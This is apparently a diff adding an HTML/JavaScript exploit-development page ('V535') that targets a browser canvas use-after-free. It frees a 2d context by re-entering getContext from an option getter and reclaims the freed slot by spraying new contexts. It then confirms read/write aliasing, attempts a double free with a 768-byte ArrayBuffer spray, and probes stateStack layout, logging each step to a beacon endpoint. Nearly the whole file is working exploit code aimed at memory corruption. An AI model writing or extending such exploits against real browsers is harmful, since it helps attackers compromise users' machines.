@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V535</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V535 — Canvas aliased pair + same-type reclaim
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V535-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// === T1: Use getter to save() WHILE context is still alive ===
+setTimeout(function(){
+  try{
+    B('T1-START','save inside getter (before free)');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var saveWorked = false;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() {
+        inner = c.getContext('2d');
+        if (inner) {
+          // Context is alive right now — save() should work
+          inner.save();
+          inner.lineWidth = 1337.5;
+          inner.save();
+          inner.lineWidth = 42.25;
+          saveWorked = true;
+        }
+        return true;
+      }
+    });
+    var outer = c.getContext('bitmaprenderer', s);
+    B('T1-SAVED','saveWorked='+saveWorked+' inner='+(inner?'yes':'no')+' outer='+(outer?'yes':'no'));
+
+    // Context is now freed. But we saved state before free.
+    // Can we read properties? (will crash if virtual dispatch needed)
+    // DON'T try — we know it crashes.
+
+    window._inner1 = inner;
+    window._canvas1 = c;
+    B('T1-DONE','saves applied before free');
+  } catch(e) { B('T1-ERR',''+e); }
+}, 200);
+
+// === T2: Same-type reclaim — create a new 2d context to reclaim the freed slot ===
+setTimeout(function(){
+  try{
+    B('T2-START','same-type reclaim');
+
+    // First, create the UAF
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var dangling = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() {
+        dangling = c.getContext('2d');
+        return true;
+      }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!dangling) { B('T2-FAIL','no dangling'); return; }
+    B('T2-UAF','got dangling wrapper');
+
+    // Now create many new canvases with 2d contexts
+    // One should reclaim the freed 768B slot
+    var canvases = [];
+    var contexts = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      canvases.push(nc);
+      contexts.push(nctx);
+    }
+    B('T2-SPRAYED','created '+contexts.length+' new 2d contexts');
+
+    // Set unique lineWidth on each new context
+    for (var i = 0; i < contexts.length; i++) {
+      contexts[i].lineWidth = 100 + i;
+    }
+
+    // Now read lineWidth through the DANGLING wrapper
+    // If a new context reclaimed the slot, dangling.lineWidth will read
+    // one of the 100+i values instead of default 1
+    try {
+      var dlw = dangling.lineWidth;
+      B('T2-DANGLING-LW','lineWidth='+dlw);
+
+      if (dlw >= 100 && dlw < 300) {
+        var idx = dlw - 100;
+        B('T2-ALIAS','ALIASED with context #'+idx+'!');
+
+        // Verify: write through dangling, read through official
+        dangling.lineWidth = 9999.75;
+        var olw = contexts[idx].lineWidth;
+        B('T2-VERIFY','wrote 9999.75 via dangling, read '+olw+' via official');
+
+        if (olw === 9999.75) {
+          B('T2-CONFIRMED','BIDIRECTIONAL ALIAS CONFIRMED');
+          window._dangling = dangling;
+          window._official = contexts[idx];
+          window._officialIdx = idx;
+          window._allCtx = contexts;
+          window._allCanvas = canvases;
+        }
+      } else if (dlw === 1) {
+        B('T2-NO-RECLAIM','lineWidth=1 (default) — slot not reclaimed by any new context');
+      } else {
+        B('T2-UNEXPECTED','lineWidth='+dlw+' — unexpected value');
+      }
+    } catch(e) { B('T2-LW-ERR','lineWidth read CRASHED: '+e); }
+
+  } catch(e) { B('T2-ERR',''+e); }
+}, 1000);
+
+// === T3: If alias found, test save/restore state aliasing ===
+setTimeout(function(){
+  try{
+    if (!window._dangling) { B('T3-SKIP','no alias'); return; }
+    B('T3-START','state aliasing test');
+
+    var d = window._dangling;
+    var o = window._official;
+
+    // Save on official, change state, then read through dangling
+    o.lineWidth = 1;
+    o.save();
+    o.lineWidth = 777.5;
+
+    var dlw = d.lineWidth;
+    B('T3-READ','official set 777.5, dangling reads '+dlw);
+
+    // Restore through dangling — should restore official's state too
+    d.restore();
+    var olw = o.lineWidth;
+    B('T3-RESTORE','dangling restore(), official reads lw='+olw+' (expect 1)');
+
+    // Save through dangling, change, read through official
+    d.save();
+    d.globalAlpha = 0.42;
+    var oga = o.globalAlpha;
+    B('T3-GALPHA','dangling set 0.42, official reads '+oga);
+
+    B('T3-DONE','state aliasing works');
+  } catch(e) { B('T3-ERR',''+e); }
+}, 3000);
+
+// === T4: Force stateStack growth, then free and spray ===
+setTimeout(function(){
+  try{
+    if (!window._dangling) { B('T4-SKIP','no alias'); return; }
+    B('T4-START','stateStack growth');
+
+    var d = window._dangling;
+    var o = window._official;
+
+    // Vector<State,1> has inline capacity 1.
+    // To force heap allocation, save() must exceed unrealizedSaveCount threshold.
+    // When realizeSaves() runs, it grows m_stateStack.
+    // realizeSaves() is called when a DRAWING operation is done (fillRect etc)
+    // or when reading state (lineWidth getter calls state() which calls realizeSaves)
+
+    // Step 1: Many saves to build up unrealizedSaveCount
+    for (var i = 0; i < 20; i++) {
+      o.save();
+      o.lineWidth = i + 0.5;
+    }
+    B('T4-SAVED','20 saves with different lineWidths');
+
+    // Step 2: Force realizeSaves by reading state
+    var lw = o.lineWidth;
+    B('T4-REALIZED','lineWidth after realize='+lw);
+
+    // Step 3: Read through dangling to confirm alias
+    var dlw = d.lineWidth;
+    B('T4-DANGLING','dangling reads lw='+dlw+' (should match)');
+
+    // Step 4: Restore all and check each level
+    for (var i = 19; i >= 0; i--) {
+      o.restore();
+      var rlw = o.lineWidth;
+      if (i < 3 || i > 17) {
+        B('T4-R'+i,'restore #'+i+' lw='+rlw+' (expect '+(i+0.5)+')');
+      }
+    }
+
+    B('T4-DONE','stateStack growth and restore verified');
+  } catch(e) { B('T4-ERR',''+e); }
+}, 5000);
+
+// === T5: Double-free — free the reclaiming context too ===
+setTimeout(function(){
+  try{
+    if (!window._dangling || !window._officialIdx === undefined) { B('T5-SKIP','no alias'); return; }
+    B('T5-START','double free via second bitmaprenderer');
+
+    var d = window._dangling;
+    var idx = window._officialIdx;
+    var targetCanvas = window._allCanvas[idx];
+
+    // Free the official context by replacing with bitmaprenderer
+    var s5 = {};
+    Object.defineProperty(s5, 'alpha', {
+      get: function() { return true; } // no re-entry this time
+    });
+    try {
+      targetCanvas.getContext('bitmaprenderer', s5);
+      B('T5-FREED','official context freed (bitmaprenderer replaced it)');
+    } catch(e) {
+      B('T5-FREE-ERR',''+e);
+      return;
+    }
+
+    // Now BOTH the dangling wrapper and the official wrapper point to freed memory
+    // Spray ABs to reclaim
+    var spray = [];
+    for (var i = 0; i < 2000; i++) {
+      var ab = new ArrayBuffer(768);
+      // Pre-fill with marker at save_count offset
+      new Uint32Array(ab, 592, 1)[0] = 0xDEAD0000 + i;
+      spray.push(ab);
+    }
+    B('T5-SPRAYED','2000 ABs with markers at +592');
+
+    // DON'T call save() on dangling (vtable crash)
+    // Instead, scan ABs for marker corruption
+    // If the freed context memory was reclaimed by an AB,
+    // the marker at +592 will be intact (0xDEAD0000+i)
+    // But wait — we need something that writes to the AB through the old context path
+
+    // Alternative: check if any AB has NON-marker data
+    // The freed context's m_unrealizedSaveCount was 0 before free
+    // Free list writes at offset 0, rest stays
+    // AB zero-init then we write marker
+    // Nothing changes the AB through the dangling wrapper (can't call methods)
+
+    // Different idea: use the OFFICIAL wrapper (contexts[idx])
+    // It's also dangling now. Same crash problem.
+
+    B('T5-WALL','cannot call methods on either wrapper — vtable corrupted by free list');
+
+    // But: what if we DON'T free the official context, but instead
+    // force the stateStack buffer to be allocated separately, then free JUST that?
+
+    B('T5-DONE','need stateStack buffer targeting, not context targeting');
+
+  } catch(e) { B('T5-ERR',''+e); }
+}, 8000);
+
+// === T6: stateStack buffer spray — the real approach ===
+setTimeout(function(){
+  try{
+    B('T6-START','stateStack buffer approach');
+
+    // Create a fresh UAF + same-type reclaim
+    var c6 = document.createElement('canvas');
+    c6.width = 1; c6.height = 1;
+    var dang6 = null;
+    var s6 = {};
+    Object.defineProperty(s6, 'alpha', {
+      get: function() { dang6 = c6.getContext('2d'); return true; }
+    });
+    c6.getContext('bitmaprenderer', s6);
+    if (!dang6) { B('T6-FAIL','no dang'); return; }
+
+    // Same-type reclaim with 200 contexts
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      ctxs.push({canvas: nc, ctx: nc.getContext('2d')});
+    }
+
+    // Tag each
+    for (var i = 0; i < ctxs.length; i++) ctxs[i].ctx.lineWidth = 500 + i;
+
+    // Find alias
+    var dlw6;
+    try { dlw6 = dang6.lineWidth; } catch(e) { B('T6-LW-ERR',''+e); return; }
+    B('T6-LW','dangling lw='+dlw6);
+
+    if (dlw6 < 500 || dlw6 >= 700) {
+      B('T6-NO-ALIAS','not reclaimed');
+      return;
+    }
+
+    var aidx = dlw6 - 500;
+    var alias = ctxs[aidx];
+    B('T6-ALIAS','aliased with context #'+aidx);
+
+    // Force stateStack growth on the OFFICIAL context
+    // Vector<State,1>: inline capacity 1, first growth to capacity ~16
+    // sizeof(State) is what we need to determine
+    // save() increments m_unrealizedSaveCount
+    // realizeSaves (triggered by drawing/reading) copies states to heap vector
+
+    // Do 16 saves with state changes + force realize
+    for (var i = 0; i < 16; i++) {
+      alias.ctx.save();
+      alias.ctx.lineWidth = 1000 + i;
+    }
+    // Force realization
+    var rlw = alias.ctx.lineWidth;
+    B('T6-REALIZED','after 16 saves, lw='+rlw);
+
+    // Read stateStack size through dangling
+    var drlw = dang6.lineWidth;
+    B('T6-DANG-AFTER','dangling reads lw='+drlw+' (should match '+rlw+')');
+
+    // Now the stateStack has heap-allocated buffer for 16+ State entries
+    // sizeof(State) is large — probably 400-500 bytes
+    // Total buffer: 16 * ~450 = ~7200 bytes
+
+    // If we can FREE this buffer and spray ABs of the same size,
+    // then read lineWidth through the dangling wrapper (which accesses the stateStack),
+    // we'd read from the AB data!
+
+    // But we can't free just the stateStack buffer...
+    // UNLESS: we clear the stateStack by restoring all saves
+
+    // Actually, Vector shrink: when restoring all saves, does the vector shrink?
+    // Vector::removeLast() doesn't shrink capacity. The buffer stays allocated.
+    // But if we do m_stateStack.shrinkToFit() or clear()...
+    // Those are C++ calls, not accessible from JS.
+
+    // The stateStack buffer lifetime = same as the context lifetime.
+    // When the context is freed, the vector destructor frees the buffer.
+
+    B('T6-DONE','stateStack growth confirmed, need to find sizeof(State)');
+
+  } catch(e) { B('T6-ERR',''+e); }
+}, 11000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},14000);
+</script></body></html>
